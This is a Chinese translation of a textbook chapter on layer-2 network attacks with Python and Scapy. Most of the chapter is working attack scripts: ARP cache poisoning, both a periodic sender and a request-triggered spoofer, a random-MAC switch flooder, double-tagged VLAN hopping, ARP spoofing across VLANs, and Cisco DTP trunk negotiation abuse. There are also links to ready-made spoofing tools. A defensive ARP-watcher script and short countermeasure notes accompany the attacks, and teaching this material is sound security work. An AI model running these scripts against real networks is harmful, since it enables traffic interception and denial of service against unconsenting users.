# Python网络攻防之第二层攻击

本章节节选翻译自_《Understanding Network Hacks: Attack and Defense with Python》_中的第四章_Layer 2 Attacks_。该书通过网络层次划分介绍漏洞，并使用`Python`编写相关利用工具进行网络攻防，每小节均按照“`原理--代码--解释--防御`”的结构行文，此书也可与_《Python黑帽子:黑客与渗透测试编程之道》_相互参照学习，相信会达到较好的效果呦。另译者水平有限，如有错误还请指正与海涵。

0x00 摘要
=======

* * *

在本章第二层攻击当中，我们将进入网络`hacking`的奇幻之旅。让我们回顾一下，第二层是负责在以太网中，使用MAC地址来发送数据包。除了`ARP`攻击，我们将探讨交换机是如何应对`DOS`攻击的，以及如何逃逸出`VLAN`环境。

0x01 需求模块
=========

* * *

在`Python`中，你不必在意原始套接字或网络字节顺序，借由`Philippe Biondi`编写的`Scapy`，具有世界上最好的数据包生成器，你可以轻松地定制数据包。既不像在`Libnet`和`C`中那样需要指针运算，也不像在`RawIP`和`Perl`中，或者是在`Scruby`和`Ruby`中，你会被有限的几种协议所束缚。`Scapy`可以构造从`ARP`到`IP/ICMP`，再到`TCP/UDP`和`DNS/DHCP`等所有`OSI`层上的数据包，甚至是更不常见的协议也同样被支持，比如`BOOTP`,`GPRS`,`PPPoE`,`SNMP`,`Radius`,`Infrared`,`L2CAP/HCI`,`EAP`。

现在让我们在第二层网络上，使用`Scapy`来制造一些麻烦吧！首先你需要用如下的命令安装它：

```
pip install Scapy

```

现在你将步入经典著名的中间人攻击！

0x02 ARP-Cache-Poisoning
========================

* * *

如果一台主机想要发送`IP`数据包到另一台主机，就必须预先通过使用`ARP`协议请求目的`MAC`地址。这个询问会向网络中的所有成员广播。在一个完美的世界中，只有应答的主机是所需的目的主机。在一个不那么完美的世界中，攻击者会每隔几秒向它的受害者发送一个`ARP`应答报文，但是是以它自己的`MAC`地址作为响应，从而重定向该连接到其自身。因为大多数的操作系统都接受它们从未询问过的应答报文，所以该攻击才会生效！

```
#!/usr/bin/python
import sys
import time
from scapy.all import sendp, ARP, Ether    

if len(sys.argv) < 3:
    print sys.argv[0] + ": <target> <spoof_ip>"
    sys.exit(1)    

iface = "eth0"
target_ip = sys.argv[1]
fake_ip = sys.argv[2]    

ethernet = Ether()
arp = ARP(pdst=target_ip,
                psrc=fake_ip,
                op="is-at")
packet = ethernet / arp    

while True:
        sendp(packet, iface=iface)
        time.sleep(10)

```

在`Scapy`的帮助下，我们构造了一个名为`packet`的数据包，里面包括一个**Ethernet()**及一个**ARP()**头。在ARP头部中，我们设置了受害者的IP地址（`target_ip`）和我们想劫持所有连接的IP地址（`fake_ip`）。对于最后一个参数，我们设置**OP-Code**为`is-at`，声明该数据包为一个ARP响应。然后`sendp()`函数在每次发送数据包时，都等待10秒并一直循环发送下去。

需要注意的是，你必须使用`sendp()`函数而不是`send()`函数，因为数据包应该在第二层被发送。`send()`则是在第三层发送数据包。

最后，要记得启用IP转发，否则你的主机会阻塞来自受害者的连接。

```
sysctl net.ipv4.ip_forward=1

```

不要忘记检查像`IPtables`这样的数据包过滤器的设置，使用`pf`或`ipfw`或直接禁用它，现在已经了解了足够多的枯燥的理论知识，让我们直接进入一些实用的`Python`代码吧！

如果你只是用`fake_ip`来处理客户端的`ARP`缓存，那么你只会得到客户端的数据包，而无法接收到服务端的响应。如下图所示。

![enter image description here](http://drops.javaweb.org/uploads/images/5f1251de47330928f076f0023a8577661b3e36db.jpg)

如下图所示，要强制通过攻击者的主机进行双向连接，攻击者就必须使用他的`MAC`地址，来伪造客户端和服务端的相关目的地址。

![enter image description here](http://drops.javaweb.org/uploads/images/dfa0ea0c53d54ae70d72b83f8781e7969e06af4b.jpg)

我们的第一段代码有些粗糙，它发送了大量的`ARP`报文，不仅产生了所需要的流量，而且也比较暴露。隐蔽的攻击者会采取另一种策略。

一台主机如果想要获取有关`IP`地址的信息，会发出一个`ARP`请求。我们将编写一个程序，等待`ARP`请求，并为每一个接收到的请求发送一个`ARP`欺骗响应。在交换环境中，这将导致每一个连接都会流经攻击者的主机，因为在`ARP`缓存中，每一个`IP`地址都会有攻击者的`MAC`地址。这个攻击更加优雅，不像之前的那个那么嘈杂，但还是很容易被一个训练有素的管理员检测到。

如下图所示，欺骗性的响应数据包和真实主机的响应数据包被并行发送。谁的数据包先被受害者的网卡接收到，则谁获胜。

![enter image description here](http://drops.javaweb.org/uploads/images/02b5119291334574c4812767b6bdffeb7186dd41.jpg)

```
#!/usr/bin/python    

import sys
from scapy.all import sniff, sendp, ARP, Ether    

if len(sys.argv) < 2:
    print sys.argv[0] + " <iface>"
    sys.exit(0)    


def arp_poison_callback(packet):
        # Got ARP request?
        if packet[ARP].op == 1:
            answer = Ether(dst=packet[ARP].hwsrc) / ARP()
            answer[ARP].op = "is-at"
            answer[ARP].hwdst = packet[ARP].hwsrc
            answer[ARP].psrc = packet[ARP].pdst
            answer[ARP].pdst = packet[ARP].psrc    

            print "Fooling " + packet[ARP].psrc + " that " + \
                    packet[ARP].pdst + " is me"    

            sendp(answer, iface=sys.argv[1])    

sniff(prn=arp_poison_callback,
        filter="arp",
        iface=sys.argv[1],
        store=0)

```

从参数`iface`指定的网卡中，`sniff()`函数无限循环地读取数据包。将`PACP`过滤器设置为`arp`，使接收到的数据包都被自动过滤，来保证我们的回调函数`arp_poison_callback`在被调用时，只有`ARP`数据包作为输入。同时由于参数`store=0`，数据包将不会被存储。

`arp_poison_callback()`函数处理我们的实际工作。首先，它会检查`ARP`报文的`OP code`：当它是1时则为一个`ARP`请求，然后我们来生成一个响应包，在响应数据包中，我们将请求包中的源`MAC`地址和`IP`地址作为目的`MAC`地址和`IP`地址。因为我们未定义源`MAC`地址，所以`Scapy`会自动插入发送数据包的网络接口地址。

`ARP`中`IP`与`MAC`地址的对应关系会被缓存一段时间，因为它会被转储起来，对同一地址一遍又一遍地进行解析。可以用如下命令显示`ARP`缓存：

```
arp -an
? (192.168.13.5) at c0:de:de:ad:be:ef [ether] on eth0

```

这依赖于操作系统和它的版本，本地配置设置及地址被缓存的时间。

为了抵御`ARP`欺骗攻击，一方面可以使用`ARP`静态表，但是这同样可以被接收到的`ARP`响应所覆盖，这些均依赖于操作系统对`ARP`的处理代码。另一方面也可以使用像`ARP watcher`这样的工具。`ARP watcher`监控`ARP`流量，并报告可疑行为但并不阻止。现在最先进的入侵检测系统可以检测到ARP缓存中毒攻击。你应该使用上面的代码，检查一下你的`IDS`，看看它是如何表现的。

0x03 ARP-Watcher
================

* * *

接下来我们编写一个小工具，来报告所有新连接到我们网络的设备，为此它必须能够记住所有`IP`和`MAC`地址的对应关系。此外，它还可以检测出一个网络设备是否突然更改了它的`MAC`地址。

```
#!/usr/bin/python    

from scapy.all import sniff, ARP
from signal import signal, SIGINT
import sys    

arp_watcher_db_file = "/var/cache/arp-watcher.db"
ip_mac = {}    

# Save ARP table on shutdown
def sig_int_handler(signum, frame):
        print "Got SIGINT. Saving ARP database..."
        try:
                f = open(arp_watcher_db_file, "w")    

                for (ip, mac) in ip_mac.items():
                    f.write(ip + " " + mac + "\n")    

                f.close()
                print "Done."
        except IOError:
                print "Cannot write file " + arp_watcher_db_file
                sys.exit(1)    


def watch_arp(pkt):
        # got is-at pkt (ARP response)
        if pkt[ARP].op == 2:
                print pkt[ARP].hwsrc + " " + pkt[ARP].psrc    

                # Device is new. Remember it.
                if ip_mac.get(pkt[ARP].psrc) == None:
                        print "Found new device " + \
                                pkt[ARP].hwsrc + " " + \
                                pkt[ARP].psrc
                        ip_mac[pkt[ARP].psrc] = pkt[ARP].hwsrc    

                # Device is known but has a different IP
                elif ip_mac.get(pkt[ARP].psrc) and \
                        ip_mac[pkt[ARP].psrc] != pkt[ARP].hwsrc:
                                print pkt[ARP].hwsrc + \
                                        " has got new ip " + \
                                        pkt[ARP].psrc + \
                                        " (old " + ip_mac[pkt[ARP].psrc] + ")"
                                ip_mac[pkt[ARP].psrc] = pkt[ARP].hwsrc    

signal(SIGINT, sig_int_handler)    

if len(sys.argv) < 2:
        print sys.argv[0] + " <iface>"
        sys.exit(0)    

try:
        fh = open(arp_watcher_db_file, "r")
except IOError:
        print "Cannot read file " + arp_watcher_db_file
        sys.exit(1)    

for line in fh:
        line.chomp()
        (ip, mac) = line.split(" ")
        ip_mac[ip] = mac    

sniff(prn=watch_arp,
        filter="arp",
        iface=sys.argv[1],
        store=0)

```

开始我们定义了一个信号处理函数`sig_int_handler()`，当用户中断程序时该函数会被调用。该函数会在`ip_mac`字典中，将所有已知的`IP`和`MAC`地址对应关系保存到一个文件当中。一开始我们读取这些`ARP db`文件，用目前已知的所有对应关系来初始化程序，若文件无法读取则退出。然后我们将文件内容一行一行地循环读取，把每一行分割为`IP`和`MAC`地址，将它们保存到`ip_mac`字典中。我们再调用已知的`sniff()`函数，对每一个接收到的`ARP`数据包，调用回调函数`watch_arp`。

`watch_arp`函数是整个程序中的核心逻辑部分。当嗅探到的数据包是`is-at`数据包时，则该数据包为一个`ARP`响应。紧接着我们首先检查IP是否存在于`ip_mac`字典中。如果我们没有发现对应条目，则其为一个新设备，并在屏幕上显示一条信息。否则我们将数据包中的`MAC`地址与字典中的`MAC`相比较，如果不同则响应很可是伪造的，我们也在屏幕上显示一条消息。在这两种情况下，都会用新的信息来更新字典。

0x04 MAC-Flooder
================

* * *

交换机和其他计算机一样，具有有限的内存，交换机中存放`MAC`地址信息的表格也同样如此，该表格记录哪个`MAC`地址对应哪个端口及其内部的`ARP`缓存。当交换机的缓冲区溢出时，它们的反应就会有些古怪。这将会导致交换机拒绝服务，以至于放弃交换行为而变得像正常的集线器。在集线器模式下，整体的高流量不会是你遇到的唯一问题，因此在没有附加操作下，所有已连接的计算机都会接收到完整的流量。你应该测试一下的你的交换机在这种意外情况下是如何反应的，接下来的脚本就可以做到这一点。它会产生随机的`MAC`地址，并将它们发送到你的交换机中，直到交换机的缓冲区被填满。

```
#!/usr/bin/python    

import sys
from scapy.all import *    

packet = Ether(src=RandMAC("*:*:*:*:*:*"),
                        dst=RandMAC("*:*:*:*:*:*")) / \
                        IP(src=RandIP("*.*.*.*"),
                            dst=RandIP("*.*.*.*")) / \
                        ICMP()    

if len(sys.argv) < 2:
        dev = "eth0"
else:
        dev = sys.argv[1]    

print "Flooding net with random packets on dev " + dev    

sendp(packet, iface=dev, loop=1)

```

`RandMAC`和`RandIP`负责随机地产生地址当中的每一个字节。其余的则由`sendp()`函数的循环参数完成。

0x05 VLAN Hopping
=================

* * *

因为`VLAN`不具备安全特性，一方面标记`VLAN`取决于包含`VLAN id`的数据包头部，使用`Scapy`可以很容易创建这样的数据包。现在让我们的电脑连接到`VLAN1`，并且尝试去`ping VLAN2`上的其他主机。

```
#!/usr/bin/python    

from scapy.all import *    

packet = Ether(dst="c0:d3:de:ad:be:ef") / \
                Dot1Q(vlan=1) / \
                Dot1Q(vlan=2) / \
                IP(dst="192.168.13.3") / \
                ICMP()    

sendp(packet)

```

首先我们设定在数据包的头部当中，包含我们的`VLAN`标记，再加上一个目的主机地址。交换机将会移除第一个标记，并不决定如何处理该数据包，当它看到第二个标记`VLAN id 2`的时候，则决定转发到这个`vlan`。如果交换机连接到其他通过堆叠启用的`VLAN`交换机，这种攻击只会是成功的，否则它们就是使用的基于端口的`VLAN`。

0x06 Let’s Play Switch
======================

* * *

`Linux`可以运行在许多嵌入式网络设备上；因此凭借`Linux`操作系统，人们可以把自己的电脑变成一台功能齐全的`VALN`交换机，这并不令人惊奇。你只需要`vconfig`这种工具就够了。在根据你的操作系统安装所需的数据包后，通过以下的命令，你可以将你的主机加入到另一个`VLAN`环境中。

```
vconfig add eth0 1

```

然后你必须记住启动新设备，并给它一个`VLAN`网络中的`IP`地址。

```
ifconfig eth0.1 192.168.13.23 up

```

0x07 ARP Spoofing Over VLAN Hopping
===================================

* * *

`VLAN`会限制对同一`VLAN`的端口的广播流量，因此我们不能在默认情况下应对所有的`ARP`请求，就像在第一个`ARP spoofing`例子中看到的那样，必须每隔几秒就向受害者告诉我们的`MAC`地址。除了我们对每个数据包进行了标记和加之的目的`VLAN`，下面的代码是通用的。

```
#!/usr/bin/python    

import time
from scapy.all import sendp, ARP, Ether, Dot1Q    

iface = "eth0"
target_ip = '192.168.13.23'
fake_ip = '192.168.13.5'
fake_mac = 'c0:d3:de:ad:be:ef'
our_vlan = 1
target_vlan = 2    

packet = Ether() / \
                Dot1Q(vlan=our_vlan) / \
                Dot1Q(vlan=target_vlan) / \
                ARP(hwsrc=fake_mac,
                        pdst=target_ip,
                        psrc=fake_ip,
                        op="is-at")    

while True:
        sendp(packet, iface=iface)
        time.sleep(10)

```

幸运的是，防御这种类型的`VLAN`攻击并没有那么复杂：如果你真的想分离你的网络，只需要使用物理划分的交换机！

0x08 DTP Abusing
================

* * *

`DTP`（动态中继协议）是一种由思科发明的专有协议，用于如果一个端口是`trunk`端口，则交换机之间可以动态地交流。`Trunk`端口通常用于互连交换机和路由器，以便共享一些或所有已知的`VLAN`。

为了能够执行下面的代码，你需要安装`Scapy`的开发版本。同时为了`check out`出源，请先安装`Mercurial`，然后键入以下命令来克隆`Scapy repository`。

```
hg clone http://hg.secdev.org/scapy scapy

```

如果你想跟踪`Scapy`的最新版本，你只需要时不时地更新`checkout`。

```
cd scapy
hg pull

```

现在你可以将旧版本的`Scapy`变成最新版的了。

```
pip uninstall Scapy
cd scapy
python setup.py install

```

多亏了`DTP`协议，和它完全忽视任何一种安全的属性，我们现在就可以发送一个动态可取包到每一个启用DTP的思科设备，并要求它将我们的端口转变为`trunk`端口。

```
#!/usr/bin/python    

import sys
from scapy.layers.l2 import Dot3 , LLC, SNAP
from scapy.contrib.dtp import *    

if len(sys.argv) < 2:
        print sys.argv[0] + " <dev>"
        sys.exit()    

negotiate_trunk(iface=sys.argv[1])

```

作为一个可选参数，你可以设置欺骗相邻交换机的`MAC`地址，如果没有设置，则会自动生成一个随机值。

这种攻击可能会持续几分钟，但是攻击者并不关心延迟，因为他们知道在改变连接到每一个`VLAN`的可能性之后他们会得到什么！

```
vconfig add eth0 <vlan-id>
ifconfig eth0.<vlan-id> <ip_of_vlan> up

```

没有足够好的理由来使用`DTP`，所以干脆禁用掉它吧！

0x09 Tools
==========

* * *

1.  **NetCommander**
    
    `NetCommander`是一个简单的`ARP`欺骗程序。它通过对每一个可能的`IP`发送`ARP`请求，来搜索网络上存活的主机。你可以选择需要劫持的连接，然后每隔几秒，`NetCommander`就会自动地欺骗那些主机和默认网关之间的双向连接。
    
    工具的源代码可以从这里下载：[https://github.com/evilsocket/NetCommander](https://github.com/evilsocket/NetCommander)
    
2.  **Hacker’s Hideaway ARP Attack Tool**
    
    `Hacker’s Hideaway ARP Attack Tool`比`NetCommander`的功能多一些。除了欺骗特殊连接，它还支持被动欺骗所有对源`IP`的`ARP`请求，和`MAC`泛洪攻击。
    
    工具的下载链接为：[https://packetstormsecurity.org/files/81368/hharp.py.tar.bz2](https://packetstormsecurity.org/files/81368/hharp.py.tar.bz2)
    
3.  **Loki**
    
    `Loki`是一种像`Yersinia`的第二层和第三层攻击工具。它可以通过插件来扩展，也有一个漂亮的`GUI`界面。它实现了像`ARP`欺骗和泛洪，`BGP`，`RIP`路由注入之类的攻击，甚至可以攻击像HSRP和VRRP那样非常罕见的协议。
    
    工具的源代码地址为：[https://www.c0decafe.de/loki.html](https://www.c0decafe.de/loki.html)